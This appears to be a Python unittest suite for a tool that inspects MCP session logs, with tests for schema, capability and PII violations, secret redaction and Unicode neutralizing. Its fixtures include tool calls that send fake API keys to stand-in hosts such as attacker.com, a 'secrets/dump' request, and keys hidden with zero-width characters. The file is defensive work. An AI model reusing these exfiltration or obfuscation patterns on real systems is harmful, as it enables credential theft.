"""
Tests for detectors.context_violations() and the adapter plumbing it
relies on (capability capture, server-initiated request modeling,
duplex request/response pairing).

Each test builds a synthetic tap log line-by-line, lifts it through
from_mcp_session(), and asserts on the annotations that come back.
Pure stdlib, run with:  python3 -m unittest tests.test_detectors
"""
import json
import unittest
from unittest import mock

from glassport.adapters.mcp_session import from_mcp_session
from glassport.interaction_trace import AnnotationKind, EventKind
from glassport import detectors


def L(seq: int, direction: str, frame: dict) -> str:
    """One tap log line."""
    return json.dumps({"schema_version": "0.1", "seq": seq, "ts": f"t{seq}",
                       "dir": direction, "frame": frame, "raw": None})


def handshake(client_caps: dict | None = None,
              tools: list | None = None,
              start_seq: int = 1) -> list[str]:
    """Standard initialize → initialized → tools/list exchange."""
    s = start_seq
    if tools is None:
        tools = [{"name": "web_search",
                  "inputSchema": {"type": "object",
                                  "properties": {"query": {"type": "string"},
                                                 "limit": {"type": "integer"}},
                                  "required": ["query"],
                                  "additionalProperties": False}}]
    return [
        L(s, "c2s", {"jsonrpc": "2.0", "id": 1, "method": "initialize",
                     "params": {"protocolVersion": "2025-03-26",
                                "capabilities": client_caps or {},
                                "clientInfo": {"name": "test-client"}}}),
        L(s + 1, "s2c", {"jsonrpc": "2.0", "id": 1,
                         "result": {"protocolVersion": "2025-03-26",
                                    "capabilities": {"tools": {}},
                                    "serverInfo": {"name": "test-server"}}}),
        L(s + 2, "c2s", {"jsonrpc": "2.0",
                         "method": "notifications/initialized"}),
        L(s + 3, "c2s", {"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
        L(s + 4, "s2c", {"jsonrpc": "2.0", "id": 2,
                         "result": {"tools": tools}}),
    ]


def call(seq: int, rid: int, name: str, arguments: dict) -> str:
    return L(seq, "c2s", {"jsonrpc": "2.0", "id": rid, "method": "tools/call",
                          "params": {"name": name, "arguments": arguments}})


def result(seq: int, rid: int, payload: dict | None = None) -> str:
    return L(seq, "s2c", {"jsonrpc": "2.0", "id": rid,
                          "result": payload or {"content": []}})


def subcats(anns) -> list[str]:
    return [a.subcategory for a in anns]


class TestAdapterPlumbing(unittest.TestCase):
    def test_capabilities_captured_on_actors(self):
        trace = from_mcp_session(handshake(client_caps={"sampling": {}}))
        client = next(a for a in trace.actors if a.name == "mcp_client")
        server = next(a for a in trace.actors if a.name == "mcp_server")
        self.assertEqual(client.metadata.get("capabilities"), {"sampling": {}})
        self.assertEqual(server.metadata.get("capabilities"), {"tools": {}})
        self.assertEqual(client.metadata.get("client_info"),
                         {"name": "test-client"})
        self.assertEqual(server.metadata.get("server_info"),
                         {"name": "test-server"})

    def test_server_initiated_request_is_message_not_orphan(self):
        lines = handshake() + [
            L(6, "s2c", {"jsonrpc": "2.0", "id": 1,
                         "method": "ping"}),                  # server asks
            L(7, "c2s", {"jsonrpc": "2.0", "id": 1, "result": {}}),  # client answers
        ]
        trace = from_mcp_session(lines)
        srv_req = [e for e in trace.events
                   if e.metadata.get("server_initiated")
                   and not e.metadata.get("notification")]
        self.assertEqual(len(srv_req), 1)
        self.assertEqual(srv_req[0].kind, EventKind.MESSAGE)
        # client reply pairs to the server request, not to client id 1
        reply = [e for e in trace.events
                 if e.metadata.get("responds_to") == "<ping>"]
        self.assertEqual(len(reply), 1)
        self.assertEqual(reply[0].parent_event_id, srv_req[0].id)
        self.assertFalse(any(e.metadata.get("orphaned") for e in trace.events))

    def test_id_space_collision_does_not_cross_pair(self):
        # client request id 7 and server request id 7 must not collide
        lines = handshake() + [
            call(6, 7, "web_search", {"query": "x"}),
            L(7, "s2c", {"jsonrpc": "2.0", "id": 7,
                         "method": "sampling/createMessage", "params": {}}),
            result(8, 7),  # answers the CLIENT call, not the server request
        ]
        trace = from_mcp_session(lines)
        results = [e for e in trace.events if e.kind == EventKind.TOOL_RESULT]
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0].metadata.get("tool_name"), "web_search")


class TestContextViolations(unittest.TestCase):
    def test_clean_session_no_violations(self):
        lines = handshake() + [call(6, 3, "web_search", {"query": "x"}),
                               result(7, 3)]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertEqual(anns, [])

    def test_missing_required_argument(self):
        lines = handshake() + [call(6, 3, "web_search", {"limit": 5})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("schema_violation", subcats(anns))
        self.assertTrue(any("query" in a.explanation for a in anns))

    def test_wrong_argument_type(self):
        lines = handshake() + [call(6, 3, "web_search",
                                    {"query": "x", "limit": "ten"})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("schema_violation", subcats(anns))
        self.assertTrue(any("limit" in a.explanation for a in anns))

    def test_bool_is_not_integer(self):
        lines = handshake() + [call(6, 3, "web_search",
                                    {"query": "x", "limit": True})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("schema_violation", subcats(anns))

    def test_unexpected_argument(self):
        lines = handshake() + [call(6, 3, "web_search",
                                    {"query": "x", "exfil": "creds"})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("schema_violation", subcats(anns))
        self.assertTrue(any("exfil" in a.explanation for a in anns))

    def test_call_before_initialized(self):
        lines = [call(1, 1, "web_search", {"query": "x"})] + \
                handshake(start_seq=2)
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("premature_call", subcats(anns))

    def test_pipelined_call_after_list_request_not_flagged(self):
        # initialized done, tools/list REQUEST sent, call lands before the
        # response arrives — valid MCP pipelining, not a violation
        h = handshake()
        lines = h[:4] + [call(6, 3, "web_search", {"query": "x"})] + [h[4]]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertNotIn("call_before_declaration", subcats(anns))
        self.assertNotIn("premature_call", subcats(anns))

    def test_call_without_list_request_flagged(self):
        # initialized done, but the client never asked for the tool list
        h = handshake()
        lines = h[:3] + [call(6, 3, "web_search", {"query": "x"})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("call_before_declaration", subcats(anns))
        self.assertNotIn("premature_call", subcats(anns))

    def test_capability_violation(self):
        lines = handshake(client_caps={}) + [
            L(6, "s2c", {"jsonrpc": "2.0", "id": 9,
                         "method": "sampling/createMessage", "params": {}}),
        ]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("capability_violation", subcats(anns))
        self.assertTrue(any(a.severity == 3 for a in anns))

    def test_capability_granted_no_violation(self):
        lines = handshake(client_caps={"sampling": {}}) + [
            L(6, "s2c", {"jsonrpc": "2.0", "id": 9,
                         "method": "sampling/createMessage", "params": {}}),
        ]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertNotIn("capability_violation", subcats(anns))

    def test_no_initialize_seen_makes_no_capability_claim(self):
        lines = [L(1, "s2c", {"jsonrpc": "2.0", "id": 9,
                              "method": "sampling/createMessage",
                              "params": {}})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertNotIn("capability_violation", subcats(anns))

    def test_unknown_server_request_flagged(self):
        lines = handshake() + [
            L(6, "s2c", {"jsonrpc": "2.0", "id": 9,
                         "method": "secrets/dump", "params": {}}),
        ]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("unknown_server_request", subcats(anns))

    def test_ping_always_allowed(self):
        lines = handshake(client_caps={}) + [
            L(6, "s2c", {"jsonrpc": "2.0", "id": 9, "method": "ping"}),
            L(7, "c2s", {"jsonrpc": "2.0", "id": 9, "result": {}}),
        ]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertEqual(anns, [])

    def test_orphaned_response_promoted(self):
        lines = handshake() + [result(6, 999)]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("orphaned_response", subcats(anns))

    def test_surface_change_mid_session(self):
        lines = handshake() + [
            L(6, "c2s", {"jsonrpc": "2.0", "id": 3, "method": "tools/list"}),
            L(7, "s2c", {"jsonrpc": "2.0", "id": 3,
                         "result": {"tools": [{"name": "web_search"},
                                              {"name": "shell_exec"}]}}),
        ]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertIn("surface_change", subcats(anns))
        self.assertTrue(any("shell_exec" in a.explanation for a in anns))

    def test_annotations_carry_seq_and_annotator(self):
        lines = handshake() + [call(6, 3, "web_search", {})]
        anns = detectors.context_violations(from_mcp_session(lines))
        self.assertTrue(anns)
        for a in anns:
            self.assertEqual(a.annotator, "glassport.detectors")
            self.assertIsNotNone(a.metadata.get("seq"))


class TestAnnotate(unittest.TestCase):
    def test_annotate_attaches_fabricated_and_context(self):
        lines = handshake() + [
            call(6, 3, "arxiv_lookup", {"q": "x"}),     # fabricated
            call(7, 4, "web_search", {}),               # schema violation
        ]
        trace = from_mcp_session(lines)
        anns = detectors.annotate(trace)
        self.assertEqual(trace.annotations, anns)
        kinds = {a.kind for a in anns}
        self.assertIn(AnnotationKind.HALLUCINATION, kinds)
        self.assertIn("fabricated_tool_call", subcats(anns))
        self.assertIn("schema_violation", subcats(anns))


SSH_KEY = (
    "-----BEGIN RSA PRIVATE KEY-----\n"
    "MIIEpAIBAAKCAQEA0Zx9Qk3vYh7nLpRtWmCfBdXgUjHsKlMnOpQrStUvWxYzAbCdEfG\n"
    "hIjKlMnOpQrStUvWxYz0123456789abcdefghijklmnopqrstuvwxyzABCDEFGH\n"
    "-----END RSA PRIVATE KEY-----"
)


class TestExfilValidators(unittest.TestCase):
    def test_entropy_ranks_random_above_repetition(self):
        self.assertLess(detectors._calculate_entropy("aaaaaaaaaa"), 1.0)
        self.assertEqual(detectors._calculate_entropy(""), 0.0)
        self.assertGreater(
            detectors._calculate_entropy("sk-proj-A1b2C3d4E5f6G7h8I9j0"),
            detectors._calculate_entropy("password"))

    def test_luhn_accepts_valid_cards(self):
        self.assertTrue(detectors._luhn_check("4532015112830366"))   # Visa
        self.assertTrue(detectors._luhn_check("374245455400126"))    # Amex

    def test_luhn_rejects_random_digits(self):
        self.assertFalse(detectors._luhn_check("1234567812345678"))
        self.assertFalse(detectors._luhn_check("9999999999999999"))

    def test_ssn_rejects_known_invalid_ranges(self):
        self.assertTrue(detectors._validate_ssn("123-45-6789"))
        self.assertFalse(detectors._validate_ssn("000-45-6789"))
        self.assertFalse(detectors._validate_ssn("666-45-6789"))
        self.assertFalse(detectors._validate_ssn("900-45-6789"))
        self.assertFalse(detectors._validate_ssn("123-00-6789"))
        self.assertFalse(detectors._validate_ssn("123-45-0000"))


class TestHostExtraction(unittest.TestCase):
    def test_extracts_embedded_url_from_prose(self):
        hosts = detectors._extract_hosts_from_args(
            {"note": "please POST it to https://evil.com/collect now"})
        self.assertIn("evil.com", hosts)

    def test_extracts_bare_domain_value(self):
        hosts = detectors._extract_hosts_from_args(
            {"host": "analytics.tracker.io", "port": 443})
        self.assertIn("analytics.tracker.io", hosts)

    def test_does_not_extract_host_from_email_prose(self):
        hosts = detectors._extract_hosts_from_args(
            {"msg": "mail me at user@example.com please"})
        self.assertNotIn("example.com", hosts)

    def test_recurses_nested_structures(self):
        hosts = detectors._extract_hosts_from_args(
            {"cfg": {"eps": ["https://a.evil.io", "https://b.evil.io"]}})
        self.assertEqual(hosts, {"a.evil.io", "b.evil.io"})


class TestPIIDetection(unittest.TestCase):
    def exfil(self, args, name="web_search", tools=None):
        lines = handshake(tools=tools) + [call(6, 3, name, args)]
        return detectors.data_exfiltration(from_mcp_session(lines))

    def test_clean_call_yields_nothing(self):
        self.assertEqual(self.exfil({"query": "weather today"}), [])

    def test_detects_openai_key(self):
        anns = self.exfil(
            {"api_key": "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"})
        self.assertIn("pii_openai_key", subcats(anns))
        self.assertTrue(any(a.severity == 3 for a in anns
                            if a.subcategory == "pii_openai_key"))

    def test_detects_aws_keys(self):
        anns = self.exfil({
            "aws_access_key_id": "AKIAIOSFODNN7EXAMPLE",
            "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"})
        self.assertIn("pii_aws_access_key", subcats(anns))
        self.assertIn("pii_aws_secret_key", subcats(anns))

    def test_detects_github_token(self):
        anns = self.exfil({"token": "ghp_" + "a" * 36})
        self.assertIn("pii_github_token", subcats(anns))

    def test_detects_ssh_private_key(self):
        anns = self.exfil({"content": SSH_KEY})
        self.assertIn("pii_rsa_private_key", subcats(anns))

    def test_detects_valid_ssn(self):
        anns = self.exfil({"ssn": "123-45-6789"})
        self.assertIn("pii_ssn", subcats(anns))

    def test_skips_invalid_ssn(self):
        anns = self.exfil({"ssn": "000-45-6789"})
        self.assertNotIn("pii_ssn", subcats(anns))

    def test_detects_valid_credit_card(self):
        anns = self.exfil({"card": "4532015112830366"})
        self.assertIn("pii_credit_card", subcats(anns))

    def test_skips_non_luhn_digits(self):
        anns = self.exfil({"id": "1234567812345678"})
        self.assertNotIn("pii_credit_card", subcats(anns))

    def test_redaction_is_non_reversible(self):
        secret = "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
        anns = self.exfil({"api_key": secret})
        f = next(a for a in anns if a.subcategory == "pii_openai_key")
        self.assertNotIn(secret, f.explanation)
        self.assertNotIn("A1b2C3d4", f.explanation)        # no plaintext prefix
        self.assertIn("redact", f.explanation.lower())
        # metadata must not carry the raw secret either
        self.assertNotIn(secret, json.dumps(f.metadata))

    def test_detects_secret_leaked_in_result(self):
        lines = handshake() + [
            call(6, 3, "web_search", {"query": "x"}),
            result(7, 3, {"content": [
                {"type": "text", "text": "key=AKIAIOSFODNN7EXAMPLE"}]}),
        ]
        anns = detectors.data_exfiltration(from_mcp_session(lines))
        self.assertTrue(any(s.startswith("pii_in_result_")
                            for s in subcats(anns)))


class TestEgressDetection(unittest.TestCase):
    def exfil(self, args, name="web_search", tools=None):
        lines = handshake(tools=tools) + [call(6, 3, name, args)]
        return detectors.data_exfiltration(from_mcp_session(lines))

    def test_flags_undeclared_untrusted_host(self):
        anns = self.exfil({"query": "exfil to https://evil-analytics.com/c"})
        host_anns = [a for a in anns
                     if a.subcategory == "unexpected_egress_host"]
        self.assertTrue(host_anns)
        self.assertEqual(host_anns[0].metadata["host"], "evil-analytics.com")

    def test_allows_declared_host_from_description(self):
        tools = [{"name": "fetch",
                  "description": "Fetch pages via https://api.example.com",
                  "inputSchema": {"type": "object",
                                  "properties": {"url": {"type": "string"}}}}]
        anns = self.exfil({"url": "https://api.example.com/data"},
                          name="fetch", tools=tools)
        self.assertNotIn("unexpected_egress_host", subcats(anns))

    def test_trusted_cloud_without_pii_not_flagged(self):
        anns = self.exfil({"url": "https://my-bucket.s3.amazonaws.com/f.txt"})
        self.assertNotIn("unexpected_egress_host", subcats(anns))

    def test_trusted_cloud_with_pii_still_flagged_but_downgraded(self):
        # SECURITY: an allowlisted bucket must not silence a PII exfil
        anns = self.exfil({
            "url": "https://my-bucket.s3.amazonaws.com/steal",
            "api_key": "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"})
        host_anns = [a for a in anns
                     if a.subcategory == "unexpected_egress_host"]
        self.assertTrue(host_anns)                      # not suppressed
        self.assertTrue(host_anns[0].metadata.get("trusted"))
        self.assertEqual(host_anns[0].severity, 2)      # downgraded, not 3

    def test_pii_to_untrusted_host_is_critical(self):
        anns = self.exfil({
            "url": "https://attacker.com/collect",
            "api_key": "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"})
        host_anns = [a for a in anns
                     if a.subcategory == "unexpected_egress_host"]
        self.assertTrue(host_anns)
        self.assertEqual(host_anns[0].severity, 3)
        self.assertTrue(host_anns[0].metadata.get("has_pii"))


class TestExfilRegisteredInAnnotate(unittest.TestCase):
    def test_annotate_runs_data_exfiltration(self):
        lines = handshake() + [
            call(6, 3, "web_search",
                 {"query": "x", "leak": "ghp_" + "b" * 36})]
        anns = detectors.annotate(from_mcp_session(lines))
        self.assertIn("pii_github_token", subcats(anns))


class TestNeutralizeText(unittest.TestCase):
    """The renderer neutralizer (Kimi round 2): reveal deceptive Unicode as
    visible ‹U+XXXX› sentinels and collapse Zalgo runs, without touching
    legitimate text. Consumed by report.py / sarif.py."""

    def test_plain_ascii_passes_through(self):
        self.assertEqual(detectors.neutralize_text("hello tool_x"),
                         "hello tool_x")

    def test_legit_diacritic_preserved(self):
        # a lone combining acute (café) is legitimate — not revealed
        out = detectors.neutralize_text("café")
        self.assertNotIn("‹U+", out)
        self.assertNotIn("‹combining", out)

    def test_fullwidth_homoglyph_revealed(self):
        out = detectors.neutralize_text("ｓystem")   # fullwidth 's'
        self.assertIn("‹U+FF53›", out)

    def test_math_alphanumeric_revealed(self):
        out = detectors.neutralize_text("\U0001D42Cystem")  # math bold 's'
        self.assertIn("‹U+1D42C›", out)

    def test_exotic_whitespace_revealed(self):
        for cp in (" ", "　", " "):  # NBSP, ideographic, line sep
            out = detectors.neutralize_text("a" + cp + "b")
            self.assertIn(f"‹U+{ord(cp):04X}›", out)

    def test_bidi_override_revealed(self):
        out = detectors.neutralize_text("a‮b")   # RTL override
        self.assertIn("‹U+202E›", out)

    def test_zalgo_run_collapsed(self):
        out = detectors.neutralize_text("e" + "́" * 20)
        self.assertIn("‹combining…›", out)

    def test_zalgo_zwj_interleave_still_collapsed(self):
        # SECURITY: interleaving each combining mark with a ZWJ must not reset
        # the run counter (two-pass neutralize treats invisibles as transparent)
        out = detectors.neutralize_text("e" + "́‍" * 20)
        self.assertIn("‹combining…›", out)


class TestStripeKeyPattern(unittest.TestCase):
    """The novel-credential gap: stripe_key detection + redaction."""

    def test_stripe_live_key_detected_and_redacted(self):
        v = "sk_live_" + "A" * 24
        self.assertTrue(any(p.category == "stripe_key"
                            for p, _ in detectors._scan_pii(v)))
        self.assertIn("stripe_key redacted", detectors.redact_secrets(v))

    def test_underscore_body_still_matches(self):
        # the fixture shape: early underscore keeps it below GitHub secret
        # scanning's contiguous-alnum bar but glassport still matches it
        v = "sk_test__EXAMPLE_not_a_real_key_00000000"
        self.assertTrue(any(p.category == "stripe_key"
                            for p, _ in detectors._scan_pii(v)))


class TestRedactFailClosed(unittest.TestCase):
    """S2 — shareable renderers must fail CLOSED when the scan raises."""

    def _boom(self, *a, **k):
        raise RuntimeError("scan blew up")

    def test_strict_withholds_when_scan_raises(self):
        secret = "sk_live_" + "B" * 24
        with mock.patch.object(detectors, "_scan_pii", self._boom):
            out = detectors.redact_secrets_strict(secret)
        self.assertEqual(out, detectors._WITHHELD)
        self.assertNotIn(secret, out)          # the secret never survives

    def test_lenient_still_returns_input_when_scan_raises(self):
        # the split must preserve best-effort behavior for internal callers
        text = "just some analytical text"
        with mock.patch.object(detectors, "_scan_pii", self._boom):
            self.assertEqual(detectors.redact_secrets(text), text)

    def test_placeholder_is_attacker_free(self):
        # the withheld literal must not interpolate input, length, or exception
        with mock.patch.object(detectors, "_scan_pii", self._boom):
            out = detectors.redact_secrets_strict("A" * 999)
        self.assertNotIn("999", out)
        self.assertNotIn("A" * 10, out)

    def test_happy_path_both_variants_redact(self):
        v = "sk_live_" + "C" * 24
        self.assertIn("stripe_key redacted", detectors.redact_secrets(v))
        self.assertIn("stripe_key redacted", detectors.redact_secrets_strict(v))
        self.assertNotIn(v, detectors.redact_secrets_strict(v))


class TestRedactObfuscated(unittest.TestCase):
    def _key(self):
        return "sk-ant-api03-" + "A" * 40 + "1234567890"

    def test_zero_width_split_key_is_removed(self):
        zwj = "‍"
        obf = "sk-ant-api03-" + "A" * 20 + zwj + "A" * 20 + "1234567890"
        out = detectors.redact_secrets_strict(obf)
        # the reconstructed (de-obfuscated) secret must NOT survive
        self.assertNotIn(self._key(), out.replace(zwj, ""))
        self.assertNotIn(zwj, out)                 # obfuscation bytes gone too
        self.assertIn("redacted", out)

    def test_combining_mark_split_key_is_removed(self):
        # issue #64: a synthetic combining mark on every char (Zalgo-lite),
        # not detected by NFKC (no compatibility mapping for an artificial
        # base+mark pair). Confirmed reconstructable pre-fix via an
        # independent oracle across report.html and provenance->SARIF/JSON/
        # text before this fix.
        mark = "̲"  # COMBINING LOW LINE
        obf = "".join(c + mark for c in self._key())
        out = detectors.redact_secrets_strict(obf)
        self.assertNotIn(self._key(), out.replace(mark, ""))
        self.assertNotIn(mark, out)
        self.assertIn("redacted", out)

    def test_small_capital_key_is_removed(self):
        # issue #64: U+1D00 LATIN LETTER SMALL CAPITAL A has NO Unicode
        # decomposition at all (confirmed via unicodedata.decomposition()) —
        # it is a phonetic-extension letter, not a compatibility variant of
        # 'A', so NFKC can never fold it; only the curated confusables table
        # closes this.
        obf = self._key().replace("A", "ᴀ")
        out = detectors.redact_secrets_strict(obf)
        self.assertNotIn(self._key(), out)
        self.assertNotIn("ᴀ", out)
        self.assertIn("redacted", out)

    def test_clean_key_still_redacted(self):
        out = detectors.redact_secrets_strict(self._key())
        self.assertNotIn(self._key(), out)
        self.assertIn("anthropic_key redacted", out)

    def test_backstop_withholds_if_secret_survives(self):
        # force a survivor: patch the span redactor to a no-op
        with mock.patch.object(detectors, "_apply_span_redactions",
                               side_effect=lambda text, spans: text):
            out = detectors.redact_secrets_strict(self._key())
        self.assertEqual(out, detectors._WITHHELD)

    def test_overlapping_default_patterns_no_fragment_leak(self):
        # generic_api_key span (9,47) with private_ip (13,24) nested inside —
        # a naive right-to-left splice leaks the secret's tail.
        text = 'api_key="some192.168.1.1xyz1234567890extra00000"'
        out = detectors.redact_secrets_strict(text)
        self.assertNotIn("1234567890extra00000", out)   # no secret fragment
        self.assertNotIn("192.168.1.1", out)            # nor the nested IP
        self.assertNotIn("some192", out)
        self.assertNotEqual(out, text)                  # not a silent passthrough

    def test_disjoint_spans_unchanged(self):
        # two separate secrets far apart still each redacted, order preserved
        text = ("first sk-ant-api03-" + "A" * 40 + "1234567890"
                " and second ghp_" + "b" * 36)
        out = detectors.redact_secrets_strict(text)
        self.assertNotIn("sk-ant-api03-AAAA", out)
        self.assertNotIn("ghp_bbbb", out)
        self.assertEqual(out.count("redacted"), 2)


class TestRedactPrimaryScanFailClosed(unittest.TestCase):
    def test_strict_withholds_when_primary_scan_raises(self):
        with mock.patch.object(detectors, "_spanned_original_redactions",
                               side_effect=RuntimeError("boom")):
            self.assertEqual(
                detectors.redact_secrets_strict("sk-ant-api03-" + "A" * 40),
                detectors._WITHHELD)

    def test_lenient_returns_input_when_primary_scan_raises(self):
        with mock.patch.object(detectors, "_spanned_original_redactions",
                               side_effect=RuntimeError("boom")):
            self.assertEqual(detectors.redact_secrets("hello world"), "hello world")


if __name__ == "__main__":
    unittest.main()
